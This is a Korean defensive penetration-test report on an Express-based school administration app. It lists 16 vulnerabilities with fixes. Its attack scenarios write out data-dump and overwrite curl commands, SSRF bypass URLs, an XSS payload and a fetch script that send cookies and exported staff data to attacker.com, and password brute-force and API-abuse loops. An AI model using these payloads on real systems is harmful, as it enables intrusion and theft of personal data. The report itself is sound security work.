# 🔒 AIroom (백암초 교무실) 보안 취약점 분석 보고서

**작성일**: 2026-04-08  
**대상 시스템**: AIroom - 학교 행정 관리 웹 애플리케이션  
**분석 관점**: 공격자(해커) 시점의 침투 테스트 기반 분석  
**기술 스택**: Node.js + Express.js / Vanilla JS / Upstash Redis / Firebase Storage  

---

## 📋 요약 (Executive Summary)

| 등급 | 취약점 수 | 설명 |
|------|-----------|------|
| 🔴 **심각 (Critical)** | 4건 | 즉시 조치 필요 - 시스템 전체 탈취 가능 |
| 🟠 **높음 (High)** | 5건 | 빠른 조치 필요 - 데이터 유출/변조 가능 |
| 🟡 **중간 (Medium)** | 4건 | 계획적 조치 필요 - 부분적 위험 |
| 🔵 **낮음 (Low)** | 3건 | 개선 권장 - 보안 강화 |
| **합계** | **16건** | |

---

## 🔴 심각 (Critical) — 즉시 조치 필요

### VULN-001: 인증/인가 부재 (Authentication & Authorization Missing)

**위치**: `server.js` 전체 API 라우트 (Line 135-198)  
**CVSS 점수**: 9.8 / 10  
**공격 난이도**: ⭐ (매우 쉬움)

**현황**:
```
모든 API 엔드포인트가 인증 없이 공개 접근 가능
- GET/POST /api/links, /api/staff, /api/trainings 등 13개 리소스
- GET /api/export (전체 데이터 다운로드)
- POST /api/import (전체 데이터 덮어쓰기)
```

**공격 시나리오**:
```bash
# 공격자가 모든 교직원 정보, 일정, 연수 기록을 탈취
curl https://target.vercel.app/api/export

# 공격자가 전체 데이터를 악의적 데이터로 교체
curl -X POST https://target.vercel.app/api/import \
  -H "Content-Type: application/json" \
  -d '{"staff":[],"trainings":[],"links":[]}'
```

**영향**: 
- 전체 교직원 개인정보 유출
- 학교 일정/연수 기록 변조 또는 삭제
- 시스템 완전 마비 가능

**권고 조치**:
- JWT 또는 세션 기반 인증 시스템 도입
- 접근 전 인증 코드 입력 화면 추가
- 관리자/일반 사용자 역할 분리 (RBAC)

---

### VULN-002: 전체 데이터 Import/Export 무방비 노출

**위치**: `server.js` Line 164-198  
**CVSS 점수**: 9.1 / 10  
**공격 난이도**: ⭐ (매우 쉬움)

**현황**:
```javascript
// server.js:178 — 어떤 검증도 없이 전체 데이터 교체 가능
app.post('/api/import', async (req, res) => {
    const { links, categories, sections, ... } = req.body;
    // → 스키마 검증 없음, 인증 없음, 크기 제한 느슨함(50MB)
});
```

**공격 시나리오**:
1. `/api/export`로 현재 데이터 백업 확보
2. 데이터 변조 후 `/api/import`로 주입
3. 교직원 연락처를 피싱 번호로 변경, 링크를 악성 사이트로 교체

**영향**: 전체 시스템 데이터 무결성 파괴

**권고 조치**:
- Import/Export에 관리자 전용 인증 필수
- Import 시 JSON 스키마 검증 (joi, zod 등)
- Import 전 자동 백업 생성

---

### VULN-003: SSRF (Server-Side Request Forgery) 취약점

**위치**: `server.js` Line 225-245 (`/api/proxy-download`)  
**CVSS 점수**: 8.6 / 10  
**공격 난이도**: ⭐⭐ (쉬움)

**현황**:
```javascript
// server.js:230 — 문자열 포함 검사만으로 URL 검증
if (!url.includes('firebasestorage.googleapis.com') && 
    !url.includes('storage.googleapis.com')) {
    return res.status(403).json({ error: '허용되지 않는 URL' });
}
```

**공격 시나리오**:
```bash
# 공격자가 자신의 서버를 경유하여 내부 네트워크 스캔
curl "https://target.vercel.app/api/proxy-download?url=https://firebasestorage.googleapis.com.attacker.com/internal-scan"

# 서브도메인으로 우회
curl "https://target.vercel.app/api/proxy-download?url=https://attacker.com?firebasestorage.googleapis.com"
```

**영향**: 
- 내부 네트워크 서비스 스캔 및 접근
- 서버 측 자원 남용
- 클라우드 메타데이터 API 접근 가능성 (169.254.169.254)

**권고 조치**:
```javascript
// URL 파싱을 통한 정확한 도메인 검증
const parsed = new URL(url);
const allowedHosts = ['firebasestorage.googleapis.com', 'storage.googleapis.com'];
if (!allowedHosts.includes(parsed.hostname)) {
    return res.status(403).json({ error: '허용되지 않는 URL' });
}
```

---

### VULN-004: XSS (Cross-Site Scripting) 취약점

**위치**: `public/index.html` Line ~2499-2514 (일정 인쇄 기능)  
**CVSS 점수**: 8.1 / 10  
**공격 난이도**: ⭐⭐ (쉬움)

**현황**:
```javascript
// index.html — 일정 제목이 이스케이프 없이 document.write에 삽입됨
const title = schedules[0]?.title || '';
win.document.write(`<title>${title}</title>`);  // XSS!
```

**공격 시나리오**:
1. `/api/schedules`에 악성 일정 등록 (인증 없으므로 가능)
```json
{
  "date": "2026-04-10",
  "events": [{
    "title": "</title><script>document.location='https://attacker.com/steal?cookie='+document.cookie</script>",
    "id": "evil"
  }]
}
```
2. 교사가 해당 일정을 인쇄하면 XSS 실행
3. 세션 정보 탈취 또는 추가 악성 행위

**영향**: 사용자 브라우저에서 임의 JavaScript 실행

**권고 조치**:
- `document.write()` 사용 제거, DOM API로 대체
- 모든 동적 데이터에 `esc()` 함수 적용

---

## 🟠 높음 (High)

### VULN-005: 예측 가능한 토큰 생성

**위치**: `server.js` Line 272, 312  
**CVSS 점수**: 7.5 / 10

**현황**:
```javascript
// 제출 ID 생성 — Math.random()은 암호학적으로 안전하지 않음
id: 'sub_' + Date.now() + '_' + Math.random().toString(36).slice(2, 6)
// 총 엔트로피: ~25비트 미만 → 브루트포스 가능
```

**공격 시나리오**: 
- `Date.now()`는 밀리초 단위로 예측 가능
- `Math.random()`은 시드 기반 PRNG으로 패턴 추출 가능
- 전자서명 토큰을 추측하여 무단 접근 가능

**권고 조치**:
```javascript
const crypto = require('crypto');
const token = crypto.randomBytes(32).toString('hex');
```

---

### VULN-006: 평문 비밀번호 저장 및 타이밍 공격

**위치**: `server.js` Line 328  
**CVSS 점수**: 7.2 / 10

**현황**:
```javascript
// 비밀번호가 해시 없이 평문으로 저장됨
if (doc.password && doc.password !== req.body.password) {
    // 단순 문자열 비교 → 타이밍 사이드채널 공격에 취약
}
```

**공격 시나리오**:
- Redis/파일에서 데이터 유출 시 비밀번호 즉시 노출
- 타이밍 차이를 측정하여 비밀번호 한 글자씩 추측 가능

**권고 조치**:
- `bcrypt` 또는 `argon2`로 비밀번호 해시 저장
- `crypto.timingSafeEqual()`로 비교

---

### VULN-007: 무제한 요청 허용 (Rate Limiting 부재)

**위치**: `server.js` 전체  
**CVSS 점수**: 7.0 / 10

**현황**: 모든 엔드포인트에 요청 횟수 제한 없음

**공격 시나리오**:
```bash
# 비밀번호 브루트포스 (초당 수천 회)
for pw in $(cat wordlist.txt); do
  curl -s -X POST https://target/api/tdist-subs/doc123 \
    -H "Content-Type: application/json" \
    -d "{\"password\":\"$pw\"}"
done

# AI API 남용 (Groq API 키 소진)
while true; do
  curl -X POST https://target/api/ai/chat \
    -H "Content-Type: application/json" \
    -d '{"messages":[{"role":"user","content":"write a 10000 word essay"}]}'
done
```

**영향**: 
- 비밀번호 크래킹
- 서버 과부하 (DoS)
- 외부 API 비용 폭증

**권고 조치**:
- `express-rate-limit` 미들웨어 도입
- IP 기반 요청 제한 (예: 분당 60회)
- AI 엔드포인트 별도 제한 (분당 10회)

---

### VULN-008: 입력 검증 부재 (Zero Input Validation)

**위치**: `server.js` 모든 POST 엔드포인트  
**CVSS 점수**: 7.0 / 10

**현황**:
```javascript
// server.js:146 — req.body를 그대로 저장
app.post(`/api/${p}`, async (req, res) => {
    await writeData(file, req.body);  // 아무 데이터나 저장됨
});
```

**공격 시나리오**:
- 프로토타입 오염(Prototype Pollution): `{"__proto__": {"isAdmin": true}}`
- 대용량 데이터 주입: 50MB까지 JSON 허용
- 잘못된 데이터 구조로 프론트엔드 크래시 유발

**권고 조치**:
- zod/joi 등을 활용한 스키마 검증
- JSON 크기 제한 적절히 조정 (5MB 이하)
- Content-Type 검증 강화

---

### VULN-009: CORS 정책 미설정

**위치**: `server.js` — CORS 헤더 설정 없음  
**CVSS 점수**: 6.5 / 10

**현황**: 어떤 도메인에서든 API 요청 가능

**공격 시나리오**:
```html
<!-- 공격자의 피싱 사이트에서 -->
<script>
  fetch('https://target.vercel.app/api/export')
    .then(r => r.json())
    .then(data => {
      // 전체 학교 데이터를 공격자 서버로 전송
      fetch('https://attacker.com/steal', {
        method: 'POST',
        body: JSON.stringify(data)
      });
    });
</script>
```

**권고 조치**:
```javascript
const cors = require('cors');
app.use(cors({
    origin: ['https://your-school.vercel.app'],
    methods: ['GET', 'POST', 'PATCH'],
    credentials: true
}));
```

---

## 🟡 중간 (Medium)

### VULN-010: API 키 노출 위험

**위치**: `.env` 파일, `server.js` Line 347  
**CVSS 점수**: 6.0 / 10

**현황**:
- `.env`에 GROQ API 키 평문 저장
- 클라이언트가 `x-ai-key` 헤더로 직접 API 키 전달 가능
- Firebase 설정이 공개 엔드포인트로 노출

**권고 조치**:
- 환경변수만 사용, `.env` 파일은 `.gitignore`에 추가 (이미 됨)
- 클라이언트 측 API 키 전달 기능 제거
- Firebase Security Rules 강화

---

### VULN-011: 에러 메시지 정보 노출

**위치**: `server.js` 다수 라인 (148, 161, 174, 197, 243, 359)  
**CVSS 점수**: 5.3 / 10

**현황**:
```javascript
// 내부 에러 메시지가 클라이언트에 직접 노출
res.status(500).json({ error: e.message });
```

**공격 시나리오**: 에러 메시지에서 파일 경로, 스택 추적, 내부 구조 파악

**권고 조치**:
```javascript
// 프로덕션에서는 제네릭 메시지만 반환
res.status(500).json({ error: '서버 오류가 발생했습니다.' });
// 상세 로그는 서버 측에서만 기록
console.error('API Error:', e);
```

---

### VULN-012: CSRF (Cross-Site Request Forgery) 보호 부재

**위치**: 모든 상태 변경 API 엔드포인트  
**CVSS 점수**: 5.0 / 10

**현황**: CSRF 토큰 검증 없음. 사용자가 악성 사이트를 방문하면 의도치 않은 API 호출 가능.

**권고 조치**:
- CSRF 토큰 미들웨어 도입 (`csurf` 또는 커스텀)
- SameSite 쿠키 속성 설정

---

### VULN-013: 과도한 JSON 페이로드 허용

**위치**: `server.js` Line 22  
**CVSS 점수**: 5.0 / 10

**현황**:
```javascript
app.use(express.json({ limit: '50mb' }));  // 50MB는 과도함
```

**공격 시나리오**: 대용량 JSON 반복 전송으로 메모리/디스크 소진

**권고 조치**: 일반 API는 1MB, 문서 업로드 전용 엔드포인트만 10MB로 분리

---

## 🔵 낮음 (Low)

### VULN-014: 보안 HTTP 헤더 미설정

**현황**: `X-Content-Type-Options`, `X-Frame-Options`, `Content-Security-Policy`, `Strict-Transport-Security` 등 미설정

**권고 조치**: `helmet` 미들웨어 도입
```javascript
const helmet = require('helmet');
app.use(helmet());
```

---

### VULN-015: localStorage에 민감 데이터 저장

**위치**: `public/index.html` — localStorage에 전체 앱 상태 캐시

**현황**: 브라우저 localStorage는 암호화되지 않으며, 동일 도메인의 모든 JavaScript에서 접근 가능

**권고 조치**: 민감 정보는 sessionStorage 또는 httpOnly 쿠키 사용

---

### VULN-016: 감사 로그 부재

**현황**: 누가 언제 무슨 데이터를 변경했는지 추적 불가

**권고 조치**: 
- 모든 쓰기 작업에 타임스탬프 + IP + 사용자 정보 기록
- 별도 `audit-log.json` 또는 외부 로깅 서비스 연동

---

## 📊 공격 경로 맵 (Attack Path Map)

```
외부 공격자 (인터넷)
    │
    ├─[1] 인증 우회 (VULN-001) ─────────────────────────┐
    │   └─ 모든 API 직접 접근 가능                        │
    │                                                      ▼
    ├─[2] 데이터 탈취 (/api/export) ──────── 교직원 정보 유출
    │                                                      
    ├─[3] 데이터 변조 (/api/import) ──────── 시스템 파괴
    │                                         
    ├─[4] SSRF (/api/proxy-download) ──────── 내부 네트워크 침투
    │
    ├─[5] XSS (일정 인쇄) ─────────────────── 교사 브라우저 장악
    │   └─ 세션/쿠키 탈취, 키로거 설치
    │
    ├─[6] API 키 남용 (/api/ai/chat) ──────── Groq API 비용 폭증
    │
    └─[7] 브루트포스 (비밀번호) ────────────── 문서 제출 데이터 탈취
```

---

## ✅ 우선순위별 조치 로드맵

### Phase 1: 긴급 조치 (1-3일)
| # | 조치 항목 | 대상 취약점 |
|---|-----------|-------------|
| 1 | **접근 코드 인증 시스템 도입** | VULN-001 |
| 2 | **관리자 포털 분리 (admin 페이지)** | VULN-001, 002 |
| 3 | **SSRF URL 검증 수정** | VULN-003 |
| 4 | **XSS 이스케이프 수정** | VULN-004 |

### Phase 2: 보안 강화 (1-2주)
| # | 조치 항목 | 대상 취약점 |
|---|-----------|-------------|
| 5 | Rate Limiting 도입 | VULN-007 |
| 6 | 입력 스키마 검증 추가 | VULN-008 |
| 7 | CORS 정책 설정 | VULN-009 |
| 8 | 보안 토큰 생성 개선 | VULN-005 |
| 9 | 비밀번호 해시 처리 | VULN-006 |

### Phase 3: 장기 개선 (1개월)
| # | 조치 항목 | 대상 취약점 |
|---|-----------|-------------|
| 10 | 보안 헤더 설정 (helmet) | VULN-014 |
| 11 | 감사 로그 시스템 | VULN-016 |
| 12 | CSRF 보호 도입 | VULN-012 |
| 13 | 에러 메시지 정리 | VULN-011 |

---

## 🛡️ 이 보고서의 Phase 1 구현 현황

본 보고서와 함께 다음 보안 조치가 **즉시 구현**됩니다:

1. **인증 코드 시스템**: 앱 접속 시 인증 코드 입력 화면 표시
2. **관리자 전용 페이지**: `/admin` 경로의 별도 관리 대시보드
3. **세션 기반 인증**: 서버 사이드 세션 토큰 검증
4. **API 보호**: 인증되지 않은 API 요청 차단

---

*본 보고서는 화이트햇(방어적) 보안 분석 목적으로 작성되었습니다.*
